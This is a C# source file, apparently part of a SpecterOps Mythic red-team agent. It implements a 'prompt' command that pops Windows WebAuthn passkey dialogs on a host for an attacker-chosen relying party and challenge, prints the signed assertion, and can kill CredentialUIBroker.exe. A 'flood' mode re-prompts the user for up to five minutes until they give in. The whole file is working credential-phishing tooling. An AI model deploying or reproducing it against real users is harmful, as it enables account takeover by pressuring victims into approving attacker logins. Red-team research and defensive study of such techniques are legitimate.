using System.CommandLine;
using System.Diagnostics;
using DSInternals.Win32.WebAuthn;
using Microsoft.Extensions.Logging;

namespace SpecterOps.Passkeys.Mythic;

/// <summary>
/// Defines the <c>prompt</c> subcommand that triggers a Windows WebAuthn assertion (authentication) dialog.
/// </summary>
internal static class PromptCommand
{
    private static readonly TimeSpan FloodTimeout = TimeSpan.FromMinutes(5);
    private static readonly TimeSpan PromptTimeout = TimeSpan.FromMinutes(2);

    /// <summary>
    /// Creates the <c>prompt</c> command with options for relying party, challenge, credential scoping,
    /// process kill, flood mode, and authenticator attachment.
    /// </summary>
    public static Command Create()
    {
        var relyingPartyOption = new Option<string>("--relying-party", "-r")
        {
            Description = "The relying party ID (e.g., login.microsoft.com)",
            Required = true
        };

        var challengeOption = new Option<string>("--challenge", "-c")
        {
            Description = "Base64url-encoded challenge from the relying party",
            Required = true
        };

        var credentialIdOption = new Option<string?>("--credential-id", "-i")
        {
            Description = "Base64url-encoded credential ID to scope the assertion"
        };

        var killOption = new Option<bool>("--kill", "-k")
        {
            Description = "Kill the CredentialUIBroker.exe process before prompting"
        };

        var floodOption = new Option<bool>("--flood", "-f")
        {
            Description = "Repeatedly prompt for credentials until the user authenticates or the timeout expires"
        };

        var authenticatorOption = new Option<PublicKeyCredentialHint>("--authenticator", "-a")
        {
            Description = "Authenticator type hint: SecurityKey, ClientDevice, or Hybrid"
        };

        var command = new Command("prompt", "Prompt the user for a WebAuthn assertion (authentication)")
        {
            relyingPartyOption,
            challengeOption,
            credentialIdOption,
            killOption,
            floodOption,
            authenticatorOption
        };

        command.SetAction(parseResult =>
        {
            string relyingParty = parseResult.GetValue(relyingPartyOption)!;
            string challenge = parseResult.GetValue(challengeOption)!;
            string? credentialId = parseResult.GetValue(credentialIdOption);
            bool kill = parseResult.GetValue(killOption);
            bool flood = parseResult.GetValue(floodOption);
            PublicKeyCredentialHint authenticator = parseResult.GetValue(authenticatorOption);

            using ILoggerFactory loggerFactory = LoggerFactory.Create(builder =>
            {
                builder.AddSimpleConsole(options =>
                {
                    options.SingleLine = true;
                    options.TimestampFormat = "HH:mm:ss ";
                });
                builder.SetMinimumLevel(LogLevel.Information);
            });
            ILogger logger = loggerFactory.CreateLogger("Passkeys");

            byte[] challengeBytes = Base64UrlConverter.FromBase64UrlString(challenge);

            List<PublicKeyCredentialDescriptor>? allowedCredentials = null;
            if (credentialId is not null)
            {
                byte[] credentialIdBytes = Base64UrlConverter.FromBase64UrlString(credentialId);
                allowedCredentials = [new PublicKeyCredentialDescriptor(credentialIdBytes)];
            }

            var (credentialHints, attachment) = ResolveCredentialHints(authenticator);

            if (kill)
            {
                foreach (int pid in CredentialUIBrokerKiller.Kill())
                {
                    logger.LogInformation("Killed CredentialUIBroker (PID {Pid}).", pid);
                }
            }

            if (flood)
            {
                RunFlood(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment);
            }
            else
            {
                logger.LogInformation("Prompting for credentials with relying party '{RpId}' and authenticator hint '{Hint}'...", relyingParty, authenticator);
                string? result = TryPrompt(logger, relyingParty, challengeBytes, allowedCredentials, credentialHints, attachment);
                if (result is not null)
                {
                    Console.WriteLine(result);
                }
            }
        });

        return command;
    }

    /// <summary>
    /// Converts a <see cref="PublicKeyCredentialHint"/> to the library's credential hints array
    /// and the corresponding <see cref="AuthenticatorAttachment"/>.
    /// Returns <c>null</c> hints and <see cref="AuthenticatorAttachment.Any"/> if no specific hint was requested.
    /// </summary>
    private static (DSInternals.Win32.WebAuthn.PublicKeyCredentialHint[]? Hints, AuthenticatorAttachment Attachment) ResolveCredentialHints(PublicKeyCredentialHint hint)
    {
        return hint switch
        {
            PublicKeyCredentialHint.SecurityKey => ([DSInternals.Win32.WebAuthn.PublicKeyCredentialHint.SecurityKey], AuthenticatorAttachment.CrossPlatform),
            PublicKeyCredentialHint.ClientDevice => ([DSInternals.Win32.WebAuthn.PublicKeyCredentialHint.ClientDevice], AuthenticatorAttachment.Platform),
            PublicKeyCredentialHint.Hybrid => ([DSInternals.Win32.WebAuthn.PublicKeyCredentialHint.Hybrid], AuthenticatorAttachment.CrossPlatform),
            _ => (null, AuthenticatorAttachment.Any)
        };
    }

    /// <summary>
    /// Repeatedly prompts the user for a WebAuthn assertion until authentication succeeds or <see cref="FloodTimeout"/> expires.
    /// </summary>
    private static void RunFlood(
        ILogger logger,
        string rpId,
        byte[] challenge,
        List<PublicKeyCredentialDescriptor>? allowedCredentials,
        DSInternals.Win32.WebAuthn.PublicKeyCredentialHint[]? credentialHints,
        AuthenticatorAttachment attachment)
    {
        Stopwatch stopwatch = Stopwatch.StartNew();
        int attempt = 0;

        logger.LogInformation("Starting credential prompt flood (timeout: {Timeout})...", FloodTimeout);

        while (stopwatch.Elapsed < FloodTimeout)
        {
            attempt++;
            logger.LogInformation("Prompt attempt {Attempt} ({Elapsed:mm\\:ss} elapsed)...", attempt, stopwatch.Elapsed);

            string? result = TryPrompt(logger, rpId, challenge, allowedCredentials, credentialHints, attachment);
            if (result is not null)
            {
                logger.LogInformation("User authenticated on attempt {Attempt} after {Elapsed:mm\\:ss}.", attempt, stopwatch.Elapsed);
                Console.WriteLine(result);
                return;
            }

            logger.LogInformation("Attempt {Attempt} timed out or was dismissed. Retrying...", attempt);
        }

        logger.LogWarning("Flood timeout reached ({Timeout}) after {Attempt} attempts. Giving up.", FloodTimeout, attempt);
    }

    /// <summary>
    /// Invokes a single WebAuthn assertion prompt and returns the JSON-encoded response,
    /// or <c>null</c> if the user cancels or the operation fails.
    /// </summary>
    private static string? TryPrompt(
        ILogger logger,
        string rpId,
        byte[] challenge,
        List<PublicKeyCredentialDescriptor>? allowedCredentials,
        DSInternals.Win32.WebAuthn.PublicKeyCredentialHint[]? credentialHints,
        AuthenticatorAttachment attachment)
    {
        try
        {
            var api = new WebAuthnApi();
            var credential = api.AuthenticatorGetAssertion(
                rpId: rpId,
                challenge: challenge,
                userVerificationRequirement: UserVerificationRequirement.Preferred,
                authenticatorAttachment: attachment,
                timeoutMilliseconds: (uint)PromptTimeout.TotalMilliseconds,
                allowCredentials: allowedCredentials,
                extensions: null,
                largeBlobOperation: CredentialLargeBlobOperation.None,
                largeBlob: null,
                browserInPrivateMode: false,
                linkedDevice: null,
                autoFill: false,
                credentialHints: credentialHints,
                remoteWebOrigin: null,
                publicKeyCredentialRequestOptionsJson: null,
                authenticatorId: null,
                windowHandle: WindowHandle.ConsoleWindow
            );

            return credential.ToString();
        }
        catch (Exception ex)
        {
            logger.LogError("Prompt failed: {Message}", ex.Message);
            return null;
        }
    }
}
